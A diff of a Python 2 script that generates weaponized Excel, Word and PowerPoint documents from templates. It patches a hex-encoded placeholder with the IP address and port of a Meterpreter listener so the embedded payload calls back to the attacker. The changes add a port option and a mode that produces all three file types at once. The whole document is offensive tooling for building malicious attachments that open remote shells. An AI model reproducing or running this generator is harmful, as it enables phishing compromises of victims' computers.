@@ -7,7 +7,7 @@ import argparse
 import binascii
 import sys
 
-def updateXLS(origFile,outFile,replaceIP):
+def updateXLS(origFile,outFile,replaceIP,replacePort):
 
 	with open(origFile, "rb") as input_file:
 		content = input_file.read()
@@ -24,8 +24,8 @@ def updateXLS(origFile,outFile,replaceIP):
 	content1 = content1.replace(origText1,replaceText1)
 
 
-	origText3 = "-Lhost xxx.xxx.xxx.xxx -Lport 1111".encode('hex')
-	replaceText3Orig = "-Lhost "+replaceIP+" -Lport 1111"
+	origText3 = "-Lhost xxx.xxx.xxx.xxx -Lport yyyyy".encode('hex')
+	replaceText3Orig = "-Lhost "+replaceIP+" -Lport "+replacePort
 	replaceText3 = replaceText3Orig.encode('hex')
 	missingLen = len(origText3)-len(replaceText3)
 	numTimes = missingLen/2
@@ -42,23 +42,54 @@ def updateXLS(origFile,outFile,replaceIP):
 if __name__ == '__main__':
     global filename
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', action='store', help='[input microsoft excel/word filename]')
-    parser.add_argument('-o', action='store', help='[output filename]')
-    parser.add_argument('-ip', action='store', help='[public ip address of meterpreter listener]')
+    parser.add_argument('-t', action='store', help='[xls|doc|ppt]')
+    parser.add_argument('-o', action='store', help='[output filename (without extension)]')
+    parser.add_argument('-ip', action='store', help='[meterpreter listener ip address]')
+    parser.add_argument('-port', action='store', help='[meterpreter listener port]')
 
     if len(sys.argv)==1:
         parser.print_help()
         sys.exit(1)
 
     options = parser.parse_args()
+    origFile = ""
+    generateAll=False
+    if options.o and options.ip:
+		    	
+    	if options.t == "all":
+			filetypeList=[] 
+			filetypeList.append('xls')
+			filetypeList.append('doc')
+			filetypeList.append('ppt')
+			for filetype in filetypeList:
 
-    if options.i and options.o and options.ip:
-	#origFile = os.getcwd()+"/"+options.i
-	origFile = options.i
-	outputFile = options.o
-	replaceIP = options.ip
-	updateXLS(origFile,outputFile,replaceIP)
-	print "- Generated :"+outputFile
-    else:
-	parser.print_help()
-	
+					if filetype == "xls":
+						origFile = os.getcwd()+"/templates/excel.xls"
+					elif filetype == "doc":
+						origFile = os.getcwd()+"/templates/word.doc"
+					elif filetype == "ppt":
+						origFile = os.getcwd()+"/templates/powerpoint.ppt"
+
+					replacePort = options.port     		
+					outputFile = options.o +"."+filetype
+					replaceIP = options.ip
+					updateXLS(origFile,outputFile,replaceIP,replacePort)
+					print "- Generated: "+outputFile
+    	else:
+
+			if options.t == "xls":
+				origFile = os.getcwd()+"/templates/excel.xls"
+			elif options.t == "doc":
+				origFile = os.getcwd()+"/templates/word.doc"
+				print origFile
+			elif options.t == "ppt":
+				origFile = os.getcwd()+"/templates/powerpoint.ppt"
+		
+			replacePort = options.port     		
+			#origFile = os.getcwd()+"/"+options.i
+			outputFile = options.o +"."+options.t
+			replaceIP = options.ip
+			updateXLS(origFile,outputFile,replaceIP,replacePort)
+			print "- Generated: "+outputFile
+			
+			
